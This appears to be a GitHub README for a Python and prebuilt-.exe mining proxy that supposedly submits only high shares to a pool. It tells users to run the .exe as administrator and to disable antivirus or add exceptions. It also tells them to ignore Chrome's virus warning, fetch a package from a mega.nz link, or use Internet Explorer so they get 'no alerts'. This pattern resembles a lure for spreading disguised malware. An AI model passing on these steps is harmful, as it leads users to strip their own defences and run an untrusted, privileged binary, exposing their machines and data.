# submitonlyhighsharesproxy
submit high shares only skip low shares written in python all you need todo is download it extract file, open cmd terminal run python3 -m pip install -r requirements.txt then run python3 submit-highshares.py or launch the .exe compiled with visual studio 2022
input your pool address like stratum://k1pool.com port is ur miners port to pool
input ur miner address with worker name thats it and hit run
This is working with latest miner software like gminer , lolminer,nbminer & trex miner
the url and port from the largehash will need to be input into ur gminer in address and port and then the shares will be forwarded to ur pool,
the ping is very low when i tested it it was 12ms 14ms on 2miners depending on what country your from.

works on all windows

please install python 10 upwards not sur if works on python 11 but may do but make sure u install requirements first otherwise proxy will fail
i have inlcuded a prebuilt .exe ready for launch . right click run as administrator.
todo

add low share option incase a user wants low shares solo or both shares solo
fyi works on shared or solo, solo is best :)

just added discord feature for notifications,
just add your discord username/handle with hashtags for notifications when block is found. and to alert when miner goes offline
and largest share found.

if ur av detects abnormal when downloading its bcuz its a modified .exe file so turn of av go to add acception then re-enable ur av
some avs i have tested and nothing apart from 1 only bcuz its a modified .exe

issues with chrome fix
download package from https://mega.nz/file/xiwi3TiR#4yRA2SRp5nv8MxajaU8Ef80k77oxvSChttWahl8K5vE
or reopen github with internet explorer no alerts
add acception from windows av
run the updater to keep it updated run on first launch if using the exe then add ur details in gui
google chrome detects it as virus but thats normal as its a custom .exe pretty much like most files specially if theres mods etc.
